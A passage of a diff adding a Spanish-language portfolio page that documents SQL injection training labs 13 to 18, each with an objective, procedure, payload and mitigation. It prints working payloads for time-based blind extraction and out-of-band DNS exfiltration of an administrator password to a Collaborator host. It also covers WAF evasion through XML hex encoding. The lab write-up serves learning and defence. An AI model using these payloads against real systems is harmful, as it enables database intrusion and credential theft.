+                                producción y utilizar sentencias preparadas.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab13.png" alt="Evidencia Lab 13" loading="lazy">
+                                <img src="../Labs img/Lab13.png" alt="Lab 13 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 14 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">14</span>
+                            <div class="lab-info">
+                                <h3>Blind SQL injection with time delays</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Time-based Blind</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Confirmar la vulnerabilidad logrando que la aplicación pause su respuesta durante 10
+                                segundos.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Cuando no hay cambios visuales ni errores, se inyectan funciones de retardo (como
+                                <code>pg_sleep</code>). El tiempo de respuesta del servidor se convierte en el canal de
+                                salida para confirmar la ejecución de código.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Identificar la cookie <code>TrackingId</code> en el proxy.</li>
+                                <li>Inyectar el comando de retardo específico para PostgreSQL.</li>
+                                <li>Verificar que el tiempo de respuesta sea superior a 10,000 ms.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">'; SELECT pg_sleep(10)--</div>
+                            <p><strong>Análisis:</strong> Detiene la ejecución de la consulta por 10 segundos. No
+                                devuelve datos, pero confirma el control total sobre el motor SQL.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Implementar validación de entradas y configurar tiempos de
+                                espera (timeouts) estrictos en la base de datos.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab14.png" alt="Evidencia Lab 14" loading="lazy">
+                                <img src="../Labs img/Lab14.png" alt="Lab 14 Solved" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 15 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">15</span>
+                            <div class="lab-info">
+                                <h3>Blind SQL injection with time delays and information retrieval</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Time-based Blind (Exfiltración)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Recuperar la contraseña del administrador utilizando retardos de tiempo condicionales.
+                            </p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Se combina la lógica booleana con funciones de tiempo. El servidor solo "duerme" si la
+                                suposición sobre un carácter de la contraseña es correcta, permitiendo la exfiltración
+                                lenta pero efectiva.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Utilizar una estructura IF o CASE dentro de la inyección.</li>
+                                <li>Evaluar cada carácter: <code>IF (SUBSTR(password,1,1)='a') pg_sleep(5)</code>.</li>
+                                <li>Automatizar con Burp Intruder para medir los tiempos de respuesta de cada petición.
+                                </li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(5)
+                                ELSE pg_sleep(0) END FROM users)--</div>
+                            <p><strong>Análisis:</strong> La pausa de 5 segundos solo ocurre ante un acierto,
+                                permitiendo reconstruir la contraseña bit a bit.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Aplicar filtros de red y consultas parametrizadas para
+                                neutralizar la ejecución de funciones de sistema.</div>
+                            <div class="lab-img-grid">
+                                <img src="../Labs img/EvidenciaLab15.png" alt="Evidencia Lab 15" loading="lazy">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 16 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">16</span>
+                            <div class="lab-info">
+                                <h3>Blind SQL injection with out-of-band interaction</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Blind Out-of-Band (OAST)</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Provocar una interacción DNS externa desde el servidor vulnerable hacia Burp
+                                Collaborator.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Se utiliza la capacidad de la base de datos para realizar consultas de red. Al inyectar
+                                una función que resuelve un dominio externo, se confirma la vulnerabilidad incluso si el
+                                servidor es totalmente "ciego" a nivel HTTP.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Generar un subdominio en Burp Collaborator.</li>
+                                <li>Inyectar una subconsulta que realice un lookup DNS hacia ese dominio.</li>
+                                <li>Verificar la recepción de la solicitud DNS en el panel de Collaborator.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml
+                                version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM
+                                "http://BURP-COLLABORATOR/"&gt; %remote;]&gt;'),'/l') FROM dual)--</div>
+                            <p><strong>Análisis:</strong> Utiliza entidades XML para forzar una petición externa
+                                HTTP/DNS, saltando las limitaciones de la respuesta del servidor web.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Restringir las conexiones salientes del servidor de base de
+                                datos a nivel de firewall de red (egress filtering).</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 17 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number">17</span>
+                            <div class="lab-info">
+                                <h3>Blind SQL injection with out-of-band data exfiltration</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">Blind Out-of-Band con exfiltración</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Extraer la contraseña del administrador enviándola como parte de un subdominio DNS.</p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>Es la técnica más avanzada de exfiltración. Se concatena la información robada
+                                (contraseña) con un dominio controlado por el atacante. El servidor DNS registra el
+                                subdominio, que contiene los datos sensibles.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Capturar la cookie <code>TrackingId</code> y enviarla al Repeater.</li>
+                                <li>Construir una consulta que recupere la contraseña y la adjunte a un dominio de
+                                    Collaborator.</li>
+                                <li>Recuperar la contraseña desde los logs de interacción DNS en Burp.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">'||(SELECT password FROM users WHERE
+                                username='administrator')||'.burp-collaborator.net--</div>
+                            <p><strong>Análisis:</strong> La base de datos intenta resolver la dirección completa,
+                                exponiendo la contraseña del administrador al servidor DNS del atacante.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">Deshabilitar funciones de red en la base de datos y utilizar
+                                validación estricta en todas las cookies de rastreo.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- LAB 18 -->
+                <div class="roadmap-item">
+                    <div class="roadmap-dot"
+                        style="background: var(--accent-cyan); box-shadow: 0 0 12px rgba(5,217,232,0.6);"></div>
+                    <div class="roadmap-card" onclick="toggleLab(this)" style="border-color: rgba(5,217,232,0.3);">
+                        <div class="roadmap-card-header">
+                            <span class="lab-number" style="color: var(--accent-cyan);">18</span>
+                            <div class="lab-info">
+                                <h3>SQL injection with filter bypass via XML encoding</h3>
+                                <div class="lab-badges">
+                                    <span class="badge badge-level-practitioner">Practitioner</span>
+                                    <span class="badge badge-type">WAF Bypass / XML Injection</span>
+                                </div>
+                            </div>
+                            <i class="fas fa-chevron-down lab-expand-icon"></i>
+                        </div>
+                        <div class="lab-details">
+                            <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+                            <p>Explotar una inyección SQL protegida por un WAF mediante técnicas de codificación XML.
+                            </p>
+                            <h4><i class="fas fa-flask"></i> Explicación técnica</h4>
+                            <p>El WAF bloquea patrones comunes de SQLi. Sin embargo, al estar los datos contenidos en un
+                                formato XML, se puede codificar el payload en entidades hexadecimales que el firewall no
+                                reconoce, pero que la aplicación decodifica y ejecuta.</p>
+                            <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+                            <ol>
+                                <li>Identificar que el parámetro viaja dentro de etiquetas XML.</li>
+                                <li>Utilizar la extensión <strong>Hackvertor</strong> de Burp para convertir el payload
+                                    SQL a entidades hexadecimales XML.</li>
+                                <li>Enviar el payload codificado para evadir el WAF y extraer las credenciales.</li>
+                            </ol>
+                            <h4><i class="fas fa-code"></i> Payload utilizado</h4>
+                            <div class="payload-box">SELECT * FROM users &rarr;
+                                &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x2A;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
+                            </div>
+                            <p><strong>Análisis:</strong> La codificación oculta las palabras clave del ataque. El
+                                servidor web procesa el XML, decodifica el valor y lo entrega de forma insegura al motor
+                                SQL.</p>
+                            <h4><i class="fas fa-shield-alt"></i> Mitigación</h4>
+                            <div class="mitigation-box">No depender únicamente de WAFs basados en firmas. Implementar
+                                defensa en profundidad con consultas parametrizadas en el backend.</div>
+                        </div>
+                    </div>
+                </div>
+
+            </div><!-- end roadmap-container -->
+
+            <!-- Footer CTA -->
+            <div class="export-section" style="text-align: center; margin: 3rem 0;">
+                <p style="color: var(--text-muted); margin-bottom: 1rem;">¿Quieres el informe completo con todas las
+                    evidencias?</p>
+                <a href="../PDFs/Proyectos/Laboratorios.pdf" download class="btn"
+                    style="background: linear-gradient(135deg, #f8e71c, #f0a500); color: #000; font-weight: 800; display: inline-flex; align-items: center; gap: 0.6rem; box-shadow: 0 0 20px rgba(248,231,28,0.3);">
+                    <i class="fas fa-download"></i> Descargar Laboratorios.pdf
+                </a>
+            </div>
+
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 Alan Gilberto Sánchez Zavala</p>
+        <p class="code-font text-accent" style="margin-top: 0.5rem; color: var(--accent-yellow);">Road to Hall of Fame —
+            SQL Injection Complete</p>
+    </footer>
+
+    <script>
+        function toggleLab(card) {
+            const details = card.querySelector('.lab-details');
+            const isOpen = card.classList.contains('open');
+
+            // Close all others
+            document.querySelectorAll('.roadmap-card.open').forEach(c => {
+                c.classList.remove('open');
+                c.querySelector('.lab-details').classList.remove('open');
+            });
+
+            if (!isOpen) {
+                card.classList.add('open');
+                details.classList.add('open');
+                setTimeout(() => {
+                    card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                }, 100);
+            }
+        }
+    </script>
+
+</body>
+
+</html>
